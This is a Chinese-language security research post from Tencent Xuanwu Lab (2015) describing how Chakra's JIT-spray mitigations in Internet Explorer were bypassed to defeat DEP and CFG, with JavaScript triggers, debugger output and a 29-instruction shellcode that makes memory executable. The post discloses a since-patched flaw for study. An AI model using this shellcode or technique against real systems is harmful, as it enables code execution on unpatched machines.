@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/cn/css/style.css" type="text/css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header_top">
+    <div id="tencent_logo">
+    </div>
+    <div id="header_version">
+        <ul id="language_nav">
+          <li class="language_li"><a class="version_a" href="/cn">中文</a></li>
+          <li class="sep"><a class="version_a"> |&nbsp;&nbsp;  </a></li>
+          <li class="language_li"><a class="version_a" href="/en"> English</a></li>
+        </ul>
+    </div>
+  </div>
+
+  <div id="header_nav">
+    <div id="xuanwulab_logo"></div>
+    <div id="main_nav">
+        <ul id="menu_ul">
+        
+        <li id="menu_item">
+            <a class="navi" href="/cn">首页</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/cn/advisories">安全公告</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/cn/policy">披露原则</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/cn/archives">归档</a>
+        </li>
+        
+        <li id="menu_item">
+            <a class="navi" href="/cn/about">关于</a>
+        </li>
+        
+        </ul>
+    </div>
+  </div>
+
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用Chakra JIT绕过DEP和CFG
+    </h1>
+  
+
+
+      </header>
+       <div class="article-sum-time">
+            <p>作者： <span class="author">tombkeeper</span> &nbsp; 
+            2015-12-09
+            </p>
+       </div>
+    
+    <div class="article-entry" itemprop="articleBody">
+        <p>JIT Spray是一种诞生于2010年的漏洞利用技术，可将Shellcode嵌入到JIT引擎生成的可执行代码中。目前，包括Chakra在内的各JIT引擎几乎都针对该技术采取了防御措施，包括随机插入空指令、立即数加密等。本文将指出Chakra的JIT Spray防御措施的两个问题（分别存在于Windows 8.1及其之前的系统，以及Windows 10之中），使得攻击者可在IE中用JIT Spray技术执行Shellcode，从而绕过DEP。同时，本文还给出了一种利用Chakra的JIT引擎绕过CFG的方法。</p>
+<a id="more"></a>
+<h2 id="0x01_JIT引擎的立即数加密">0x01 JIT引擎的立即数加密</h2><p>立即数加密是最重要的JIT Spray缓解技术。Chakra引擎会对每一个高位或低位不是0x0000或0xFFFF的用户传入的立即数用随机生成的Key进行异或，再在运行时还原。例如，对于以下JavaScript：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>生成的机器指令将类似于：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">096b0091 ba555593c5      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0C5935555h</span></span><br><span class="line">096b0096 81f2c5c50355    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">5503C5C5h</span></span><br><span class="line">096b009c 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b009e bab045edfb      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0FBED45B0h</span></span><br><span class="line">096b00a3 81f220d57d6b    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">6B7DD520h</span></span><br><span class="line">096b00a9 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b00ab baef85f139      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">39F185EFh</span></span><br><span class="line">096b00b0 81f27f1561a9    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">0A961157Fh</span></span><br><span class="line">096b00b6 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>从而使所生成指令中的立即数不可预测，也就无法嵌入代码。</p>
+<h2 id="0x02_绕过Windows_8-1及其之前Chakra引擎的立即数加密">0x02 绕过Windows 8.1及其之前Chakra引擎的立即数加密</h2><p>Chakra引擎内部对整数n会以n*2+1的方式存储。所以，在处理n=n+m时，不必从n*2+1还原出n再和m相加，只需要将m*2加到n*2+1的结果上去即可。而对于m*2，Windows 8.1及其之前的Chakra引擎会认为是其自身生成的数据，而不是用户传入的，所以不会进行加密。例如对以下JavaScript：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>在某几个条件同时满足的情况下，可以让Windows 8.1及其之前的Chakra引擎生成类似这样的机器指令：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">05010090</span> <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">05010096</span> <span class="number">0f</span>80d6010000    jo      <span class="number">05010272</span></span><br><span class="line"><span class="number">0501009</span>c <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">0501009</span>e <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>a1 f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>a4 <span class="number">0f</span>8413020000    je      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>aa <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line"><span class="number">050100</span>ac <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">050100</span>b2 <span class="number">0f</span>8005020000    jo      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>b8 <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">050100</span>ba <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>bd f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>c0 <span class="number">0f</span>8442020000    je      <span class="number">05010308</span></span><br><span class="line"><span class="number">050100</span>c6 <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">05010090</span> + <span class="number">2</span> l <span class="number">3</span></span><br><span class="line"><span class="number">05010092</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010093</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010094</span> eb18            jmp     <span class="number">050100</span>ae</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">050100</span>ae l <span class="number">3</span></span><br><span class="line"><span class="number">050100</span>ae <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>af <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>b0 eb18            jmp     <span class="number">050100</span>ca</span><br></pre></td></tr></table></figure>
+<p>所以只要写出每条指令长度不大于2字节的 Shellcode，就可以嵌入到立即数中。因为实际产生的立即数是JavaScript中数字的2倍，所以使用的指令如果是2字节，第1字节必须为偶数。这是完全可能做到的。 </p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5854</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">pop</span> <span class="literal">eax</span>    <span class="comment">; eax = esp, make eax writeable</span></span><br><span class="line"><span class="number">0x5252</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">push</span> <span class="literal">edx</span>   <span class="comment">; esp -= 8</span></span><br><span class="line"><span class="number">0x016A</span>   // <span class="keyword">push</span> <span class="number">1</span></span><br><span class="line"><span class="number">0x4A5A</span>   // <span class="keyword">pop</span>  <span class="literal">edx</span>--<span class="keyword">dec</span> <span class="literal">edx</span>    <span class="comment">; edx = 0</span></span><br><span class="line"><span class="number">0x5E52</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">pop</span> <span class="literal">esi</span>    <span class="comment">; esi = 0</span></span><br><span class="line"><span class="number">0x40B6</span>   // <span class="keyword">mov</span>  <span class="number">dh</span>, <span class="number">0x40</span>        <span class="comment">; edx = 0x4000, NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x5452</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">push</span> <span class="literal">esp</span>   <span class="comment">; *esp = &amp;NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x5B90</span>   // <span class="keyword">pop</span>  <span class="literal">ebx</span>             <span class="comment">; ebx = &amp;NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x14B6</span>   // <span class="keyword">mov</span>  <span class="number">dh</span>, <span class="number">0x14</span></span><br><span class="line"><span class="number">0x14B2</span>   // <span class="keyword">mov</span>  <span class="literal">dl</span>, <span class="number">0x14</span></span><br><span class="line"><span class="number">0x5266</span>   // <span class="keyword">push</span> <span class="literal">dx</span></span><br><span class="line"><span class="number">0x5666</span>   // <span class="keyword">push</span> <span class="literal">si</span>              <span class="comment">; *esp = 0x14140000</span></span><br><span class="line"><span class="number">0x525A</span>   // <span class="keyword">pop</span>  <span class="literal">edx</span>-<span class="keyword">push</span> <span class="literal">edx</span>    <span class="comment">; edx = 0x14140000</span></span><br><span class="line"><span class="number">0x5E54</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">pop</span>  <span class="literal">esi</span>   <span class="comment">; esi = &amp;BaseAddress, </span></span><br><span class="line"><span class="number">0x5454</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">push</span> <span class="literal">esp</span>   <span class="comment">; push &amp;OldAccessProtection </span></span><br><span class="line"><span class="number">0x406A</span>   // <span class="keyword">push</span> <span class="number">0x40</span>            <span class="comment">; PAGE_EXECUTE_READWRITE</span></span><br><span class="line"><span class="number">0x5390</span>   // <span class="keyword">push</span> <span class="literal">ebx</span>             <span class="comment">; push  &amp;NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x5690</span>   // <span class="keyword">push</span> <span class="literal">esi</span>             <span class="comment">; push &amp;BaseAddress</span></span><br><span class="line"><span class="number">0xFF6A</span>   // <span class="keyword">push</span> -<span class="number">1</span>              <span class="comment">; </span></span><br><span class="line"><span class="number">0x5252</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">push</span> <span class="literal">edx</span>   <span class="comment">; set ret addr</span></span><br><span class="line"><span class="number">0x5290</span>   // <span class="keyword">push</span> <span class="literal">edx</span>             <span class="comment">; prepare esp for fs:[esi]</span></span><br><span class="line"><span class="number">0x016A</span>   // <span class="keyword">push</span> <span class="number">1</span></span><br><span class="line"><span class="number">0x4A5A</span>   // <span class="keyword">pop</span>  <span class="literal">edx</span>--<span class="keyword">dec</span> <span class="literal">edx</span>    <span class="comment">; edx = 0</span></span><br><span class="line"><span class="number">0xC0B2</span>   // <span class="keyword">mov</span>  <span class="literal">dl</span>, <span class="number">0xC0</span></span><br><span class="line"><span class="number">0x5E52</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">pop</span> <span class="literal">esi</span></span><br><span class="line"><span class="number">0x5F54</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">pop</span> <span class="literal">edi</span></span><br><span class="line"><span class="number">0xA564</span>   // movs <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>], <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> <span class="literal">fs</span>:[<span class="literal">esi</span>] <span class="comment">; *esp = *(fs:0xC0)</span></span><br><span class="line"><span class="number">0x4FB2</span>   // <span class="keyword">mov</span>  <span class="literal">dl</span>, <span class="number">0x50</span>        <span class="comment">; NtProtectVirtualMemory, Win8.1:0x4F, Win10:0x50</span></span><br><span class="line"><span class="number">0x5290</span>   // <span class="keyword">push</span> <span class="literal">edx</span></span><br><span class="line"><span class="number">0xC358</span>   // <span class="keyword">pop</span>  <span class="literal">eax</span>--<span class="keyword">ret</span>        <span class="comment">; ret to syscall</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x03_绕过Windows_10的_Chakra引擎的立即数加密">0x03 绕过Windows 10的 Chakra引擎的立即数加密</h2><p>Windows 10的Chakra引擎并没有前述问题。但是，由于Windows 10的Chakra引擎高度优化，在处理整数类型数组写入操作时，会用最高效的方式生成JIT代码。例如，对于下面的JavaScript语句：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var ar = <span class="keyword">new</span> Uint16Array(<span class="number">0x10000</span>);</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>生成的机器指令是：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">0b8110e0 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110e9 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110f2 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110fb 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>虽然Chakra引擎的JIT Spray防御措施只允许用户控制最多2字节立即数，但在上面这种情况下，数组索引和要写入的数字会出现在同一条指令中。所以实际上我们有了4字节而不是2字节的可控数据。<br>在这种情况下，同样可在其中嵌入前面提到的每条指令长度不大于2字节的Shellcode。只是由于多了中间的两字节0x00（会被作为指令“add  byte ptr [eax],al”执行），所以需要在最开始两字节的指令中将EAX设为可写的地址。</p>
+<h2 id="0x04_利用Chakra引擎绕过CFG">0x04 利用Chakra引擎绕过CFG</h2><p>利用前面介绍的两种方法，可以实施JIT Spray绕过DEP。但嵌入在JIT代码中的Shellcode执行入口地址显然无法通过CFG检查。但实际上Chakra引擎的实现中就存在可用来绕过CFG的地方。<br>无论所执行的JavaScript是否需要启动JIT，Chakra引擎都一定会在内存中生成如下入口函数：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; uf 4ff0000</span><br><span class="line">04ff0000 <span class="number">55</span>          <span class="keyword">push</span>  <span class="literal">ebp</span></span><br><span class="line">04ff0001 8bec        <span class="keyword">mov</span>   <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">04ff0003 8b4508      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff0006 8b4014      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">14h</span>]</span><br><span class="line">04ff0009 8b4840      <span class="keyword">mov</span>   <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">40h</span>]</span><br><span class="line">04ff000c 8d4508      <span class="keyword">lea</span>   <span class="literal">eax</span>,[<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff000f <span class="number">50</span>          <span class="keyword">push</span>  <span class="literal">eax</span></span><br><span class="line">04ff0010 b840cb5a71  <span class="keyword">mov</span>   <span class="literal">eax</span>, <span class="number">715acb40h</span> <span class="comment">; jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;</span></span><br><span class="line">04ff0015 ffe1        <span class="keyword">jmp</span>   <span class="literal">ecx</span></span><br></pre></td></tr></table></figure>
+<p>这个函数的指针可以通过CFG检查，同时，这个函数在jmp ecx之前，并没有对ecx的指针其进行CFG检查。所以，这个入口函数实际上相当于一个可以跳往任意地址的跳板。下面我们姑且将其称作“cfgJumper”。</p>
+<h2 id="0x05_定位JIT内存和“cfgJumper”">0x05 定位JIT内存和“cfgJumper”</h2><p>要利用JIT Spray绕过DEP和利用“cfgJumper”绕过CFG，就需要定位JIT编译后的代码和“cfgJumper”，有趣的是，找到它们的方法几乎是相同的。<br>在JavaScript中所写的任何一个函数，都对应一个Js::ScriptFunction对象。每个Js::ScriptFunction对象又包含着一个Js::FunctionBody对象。Js::FunctionBody对象中保存着调用这个JavaScript函数时实际会执行的内存指针。<br>如果一个函数未被调用过，那么它的Js::FunctionBody中存放的实际内存指针是Js::InterpreterStackFrame::DelayDynamicInterpreterThunk：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">70181720</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o ..p........</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">70181720</span> l <span class="number">1</span></span><br><span class="line">Chakra!Js::InterpreterStackFrame::DelayDynamicInterpreterThunk:</span><br><span class="line"><span class="number">70181720</span> <span class="number">55</span>              push    ebp</span><br></pre></td></tr></table></figure>
+<p>如果一个函数被调用过，但没有被编译为JIT代码，仍然是解释执行，那么它的Js::FunctionBody中存放的实际内存指针是“cfgJumper”：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00860000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00860000</span></span><br><span class="line"><span class="number">00860000</span> <span class="number">55</span>          push  ebp</span><br><span class="line"><span class="number">00860001</span> <span class="number">8</span>bec        mov   ebp,esp</span><br><span class="line"><span class="number">00860003</span> <span class="number">8</span>b4508      mov   eax,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">00860006</span> <span class="number">8</span>b4014      mov   eax,dword ptr [eax+<span class="number">14</span>h]</span><br><span class="line"><span class="number">00860009</span> <span class="number">8</span>b4840      mov   ecx,dword ptr [eax+<span class="number">40</span>h]</span><br><span class="line"><span class="number">0086000</span>c <span class="number">8</span>d4508      lea   eax,[ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">0086000f</span> <span class="number">50</span>          push  eax</span><br><span class="line"><span class="number">00860010</span> b800240870  mov   <span class="number">70082400</span>h ; Chakra!Js::InterpreterStackFrame::InterpreterThunk</span><br></pre></td></tr></table></figure>
+<p>如果一个函数被循环调用多次，导致Chakra引擎将其编译为JIT代码，那么它的Js::FunctionBody中存放的实际内存指针就是该函数编译后的JIT代码指针：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b89de70 l8</span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b8d0000 l8</span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00950000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00950000</span></span><br><span class="line"><span class="number">00950000</span> <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">00950001</span> <span class="number">8</span>bec            mov     ebp,esp</span><br><span class="line"><span class="number">00950003</span> <span class="number">81f</span>c44c9120b    cmp     esp,<span class="number">0</span>B12C944h</span><br><span class="line"><span class="number">00950009</span> <span class="number">7f</span>18            jg      <span class="number">00950023</span></span><br><span class="line"><span class="number">0095000</span>b <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">0095000f</span> <span class="number">68e0</span>c72c07      push    <span class="number">72</span>CC7E0h</span><br><span class="line"><span class="number">00950014</span> <span class="number">6844090000</span>      push    <span class="number">944</span>h</span><br></pre></td></tr></table></figure>
+<p>了解了Js::ScriptFunction和Js::FunctionBody对象的结构，以及上面所述的这些，就可以准确地找到编译后的JIT代码，和“cfgJumper”。</p>
+<h2 id="0x06_随机插入空指令的问题">0x06 随机插入空指令的问题</h2><p>除了立即数加密，Chakra引擎也采用了随机插入空指令的方法来缓解JIT Spray。不过Chakra插入空指令的密度并不高。PoC中使用的由29个16位数组成的JIT Shellcode，在针对Windows 10的利用方式中，会生成29条x86指令，其中几乎不会被插入空指令。但是在针对Windows 8.1及其之前的Chakra引擎的利用方式中，会生成约200条x86指令，就很可能被插入空指令。</p>
+<p>解决这个问题的方法是：<br>1、创建一个新的script标签，并将包含JIT ShellCode的JavaScript函数放在里面。<br>2、循环调用该函数触发JIT编译。<br>3、读取编译后的代码，判断JIT ShellCode中间是否被插入了空指令。<br>4、如果被插入了空指令，就销毁script标签，重新创建。循环上述过程。</p>
+<p>本文测试环境是安装了2015年5月补丁的Windows 8.1和Windows 10 TP 9926。<br>本文所述问题微软已于2015年9月修复。</p>
+
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://xlab.tencent.com/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/" data-id="cihyj4mf50002tsun223jl6l0" class="article-share-link"></a>
+      
+      
+  <span class="tags">标签:&nbsp;&nbsp;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/cn/tags/CFG/">CFG</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/cn/tags/Chakra/">Chakra</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/cn/tags/DEP/">DEP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/cn/tags/JIT/">JIT</a></li></ul>
+
+
+    </footer>
+  </div>
+</article>
+
+
+</section>
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <hr>
+    <div class="widget tagcloud">
+      <a href="/cn/tags/CFG/" style="font-size: 10px;">CFG</a> <a href="/cn/tags/Chakra/" style="font-size: 10px;">Chakra</a> <a href="/cn/tags/DEP/" style="font-size: 10px;">DEP</a> <a href="/cn/tags/JIT/" style="font-size: 20px;">JIT</a> <a href="/cn/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/cn/tags/RowHammer/" style="font-size: 10px;">RowHammer</a> <a href="/cn/tags/沙箱逃逸/" style="font-size: 10px;">沙箱逃逸</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <hr>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/cn/archives/2015/12/">2015-12</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/cn/archives/2015/08/">2015-08</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/cn/archives/2015/06/">2015-06</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
